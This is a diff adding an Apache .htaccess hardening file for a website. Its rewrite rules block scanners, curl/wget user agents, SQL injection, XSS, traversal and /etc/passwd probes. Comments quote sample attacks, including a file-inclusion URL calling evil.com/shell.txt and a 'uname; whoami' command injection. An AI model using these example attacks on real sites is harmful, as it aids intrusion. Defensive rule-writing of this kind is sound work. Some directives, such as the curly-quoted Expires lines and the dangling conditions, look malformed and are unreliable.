@@ -1,0 +1,179 @@
+RewriteEngine On
+ServerSignature Off
+RewriteBase /
+ErrorDocument 404 /
+
+############## from acunetix ###########
+Options -Multiviews
+############## from acunetix end ###########
+
+######## Force Cache File ########
+<FilesMatch ".(jpg|jpeg|png|ico|css)$">
+Header set Cache-Control "max-age=2592000"
+</FilesMatch>
+
+
+
+IndexIgnore *
+Options -Indexes
+ErrorDocument 403 http://www.crypto-maniac.com/
+# Follow symbolic links
+Options +FollowSymLinks
+
+
+RewriteCond %{HTTP_HOST} !^www\. [NC]
+RewriteRule ^ http://www.crypto-maniac.com%{REQUEST_URI} [R=301,L,NE]
+
+# Remove Trailing Slashes...
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{THE_REQUEST} \s(.+?)/+[?\s]
+RewriteRule ^(.+?)/$ /$1 [R=301,L,NE]
+
+# Handle Front Controller...
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^ index.php [L]
+
+
+
+########################################################
+# Allow only GET and POST verbs
+# ‘Coz most vul scanners use HEAD for hunting buggy files existence
+RewriteCond %{REQUEST_METHOD} !^(GET|POST)$ [NC,OR]
+
+# Ban Non-GUI Browsers
+RewriteCond %{HTTP_USER_AGENT} ^.*(lynx|wget).* [NC,OR]
+
+# Ban Typical Vulnerability Scanners and others
+RewriteCond %{HTTP_USER_AGENT} ^()$ [NC,OR] # void of UserAgent
+
+# Known Web vulnerabilty Scanners
+RewriteCond %{HTTP_USER_AGENT} ^.*(syhunt|sqlmap|WhatWeb|Netsparker|w3af|Nstalker|acunetix|qualys|nikto|wikto|pikto|pykto).* [NC,OR]
+
+# Random Underground Web Exploit Scanners
+RewriteCond %{HTTP_USER_AGENT} ^.*(javascript\:alert|0d\s0a|ZeW|SlimBrowser|drone|DataCha|SBIder|Shelob|MobileRunner|Microsoft\sOffice|Plesk|Itah|Mosill|Internet\sExplorer\s4\.01|al_viewer|NetSeer|MSFrontPage|Yandex|webcollage|lwp\-trivial|Isidorus|core\-project|\<script\>|Toata\sdragostea\smea\spentru\sdiavola|StackRambler|Firebat|Y\!J\-SRD|ZmEu|libwww|perl|java|curl|ruby|python|scan|kiss|ass|Morfeus|0wn|hack|h4x|h4x0r).* [NC,OR]
+
+# Denial-of-Service Tool
+RewriteCond %{HTTP_USER_AGENT} ^.*(ApacheBench).* [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(WWW\-Mechanize|revolt|Crawl|Mail\.Ru|Walker|sbide|findlinks|spide|Ace\sExplorer|winhttp|HTTrack|clshttp|archiver|loader|email|harvest|extract|grab|miner).* [NC,OR]
+
+# Disable access to cgi-bins if not used
+RewriteCond %{REQUEST_URI} ^/(cgi\.cgi|webcgi|cgi\-914|cgi\-915|bin|cgi|mpcgi|cgi\-bin|ows\-bin|cgi\-sys|cgi\-local|htbin|cgibin|cgis|scripts|cgi\-win|fcgi\-bin|cgi\-exe|cgi\-home|cgi\-perl|scgi\-bin)/ [NC,OR]
+
+# Block out common attack strings
+# Additional filtering can be put into
+# HTTP_USER_AGENT, HTTP_REFERER, HTTP_COOKIE,HTTP_FORWARDED,HTTP_ACCEPT
+
+# Directory Traversal, Null Byte Injection, HTTP Response Splitting
+RewriteCond %{QUERY_STRING} ^.*(\.\.\/|\.\.%2f|\.\.%5C|\.\.%252F|\.\.%255C|\.\.%u2215|%u002e%u002e%u2215|%252e%252e%252f|%00|\\x00|\\u00|%5C00|%09|%0D%0A) [NC,OR]
+
+# SQL Injection Probing
+RewriteCond %{QUERY_STRING} ^.*(\@\@version|CHR\(|CHAR\(|UNION%20SELECT|/select/|/union/|/insert/|/update/|/delete/).* [NC,OR]
+RewriteCond %{QUERY_STRING} ^.*(or|and)%20([0-9]=[0-9]).* [NC,OR]
+
+# Remote/Local File Inclusion
+# RFI: yoursite.com/?pg=http://evil.com/shell.txt?
+# LFI: yoursite.com/?pg=/logs/access_log?
+RewriteCond %{QUERY_STRING} .*(=https|=http|=ftp)(://|%3a%2f%2f).*\?$ [NC,OR]
+RewriteCond %{QUERY_STRING} (\/access_log|boot\.ini|\/etc\/passwd|%2Fetc%2Fpasswd|c:\\boot\.ini|c%3A\\boot\.ini|c:\/boot\.ini|c:%2Fboot\.ini|c%3A%2Fboot\.ini|c:boot\.ini|c%3Aboot\.ini).* [NC,OR]
+
+# PHP Version Probing
+RewriteCond %{QUERY_STRING} ^(=PHP).* [NC,OR]
+
+# XSS Probing
+RewriteCond %{QUERY_STRING} ^.*(\<|%3C).*script.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} ^.*(/XSS/).* [NC,OR]
+
+# PHP GLOBALS Overriding
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [NC,OR]
+
+# PHP REQUEST variable Overriding
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2}) [NC,OR]
+
+# PHP Command Injection Probing
+# vuln.php?exec=uname -a;ls -al;whoami
+RewriteCond %{QUERY_STRING} ^.*(=|;)(uname%20-|ls%20-|whoami).*
+
+# PHP CGI code execution
+RewriteCond %{QUERY_STRING} ^[^=]*$ [OR]
+RewriteCond %{QUERY_STRING} %2d|\- 
+
+# Block suspicious request methods
+RewriteCond %{REQUEST_METHOD} ^(HEAD|TRACE|DELETE|TRACK|DEBUG) [NC]
+RewriteRule ^(.*)$ - [F,L]
+
+
+# Block MySQL injections, RFI, base64, etc.
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=http:// [OR]
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=(\.\.//?)+ [OR]
+RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=/([a-z0-9_.]//?)+ [NC,OR]
+RewriteCond %{QUERY_STRING} \=PHP[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12} [NC,OR]
+RewriteCond %{QUERY_STRING} (\.\./|\.\.) [OR]
+RewriteCond %{QUERY_STRING} ftp\: [NC,OR]
+RewriteCond %{QUERY_STRING} http\: [NC,OR]
+RewriteCond %{QUERY_STRING} https\: [NC,OR]
+RewriteCond %{QUERY_STRING} \=\|w\| [NC,OR]
+RewriteCond %{QUERY_STRING} ^(.*)/self/(.*)$ [NC,OR]
+RewriteCond %{QUERY_STRING} ^(.*)cPath=http://(.*)$ [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^s]*s)+cript.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (\<|%3C).*iframe.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|%3C)([^i]*i)+frame.*(>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} base64_encode.*\(.*\) [NC,OR]
+RewriteCond %{QUERY_STRING} base64_(en|de)code[^(]*\([^)]*\) [NC,OR]
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} ^.*(\[|\]|\(|\)|<|>).* [NC,OR]
+RewriteCond %{QUERY_STRING} (NULL|OUTFILE|LOAD_FILE) [OR]
+RewriteCond %{QUERY_STRING} (\./|\../|\.../)+(motd|etc|bin) [NC,OR]
+RewriteCond %{QUERY_STRING} (localhost|loopback|127\.0\.0\.1) [NC,OR]
+RewriteCond %{QUERY_STRING} (<|>|'|%0A|%0D|%27|%3C|%3E|%00) [NC,OR]
+RewriteCond %{QUERY_STRING} concat[^\(]*\( [NC,OR]
+RewriteCond %{QUERY_STRING} union([^s]*s)+elect [NC,OR]
+RewriteCond %{QUERY_STRING} union([^a]*a)+ll([^s]*s)+elect [NC,OR]
+RewriteCond %{QUERY_STRING} (;|<|>|'|"|\)|%0A|%0D|%22|%27|%3C|%3E|%00).*(/\*|union|select|insert|drop|delete|update|cast|create|char|convert|alter|declare|order|script|set|md5|benchmark|encode) [NC,OR]
+RewriteCond %{QUERY_STRING} (sp_executesql) [NC]
+RewriteRule ^(.*)$ - [F,L]
+
+
+#########deny proxy access to register.php & login.php
+RewriteCond %{REQUEST_METHOD} =POST
+RewriteCond %{HTTP:VIA}%{HTTP:FORWARDED}%{HTTP:USERAGENT_VIA}%{HTTP:X_FORWARDED_FOR}%{HTTP:PROXY_CONNECTION} !^$ [OR]
+RewriteCond %{HTTP:XPROXY_CONNECTION}%{HTTP:HTTP_PC_REMOTE_ADDR}%{HTTP:HTTP_CLIENT_IP} !^$
+RewriteCond %{REQUEST_URI} !^/(register.php|login.php/).* [NC]
+RewriteRule .* - [F,NS,L]
+
+# Block out any script trying to set a mosConfig value through the URL
+RewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\%3D) [OR]
+
+# Block out any script that includes a <script> tag in URL
+RewriteCond %{QUERY_STRING} (<|%3C).*script.*(>|%3E) [NC,OR]
+
+AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi
+Options -ExecCGI
+
+## EXPIRES CACHING ##
+<IfModule mod_expires.c>
+ExpiresActive On
+ExpiresByType image/jpg “access 1 day”
+ExpiresByType image/jpeg “access 1 day”
+ExpiresByType image/gif “access 1 day”
+ExpiresByType image/png “access 1 day”
+ExpiresByType text/css “access 1 month”
+ExpiresByType image/x-icon “access 1 year”
+ExpiresDefault “access 2 days”
+</IfModule>
+## EXPIRES CACHING ##
+
+##protect base de donnée
+<files BaseDonnee.class.php>
+order allow,deny
+deny from all
+</files>
+
+
+
+
+
+
+
